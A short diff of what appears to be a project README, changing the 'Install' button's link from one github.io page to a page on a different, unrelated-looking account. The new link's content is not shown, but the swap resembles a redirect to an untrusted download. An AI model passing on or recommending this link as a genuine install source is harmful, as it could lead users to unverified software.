@@ -11,7 +11,7 @@
   <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/>
 </p>
 <p align="center">
-  <a href="https://marat-klubnika-apps.github.io/.github/">
+  <a href="https://day-deneg-pzh.github.io/.github/ticktick">
     <img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/>
   </a>
 </p>
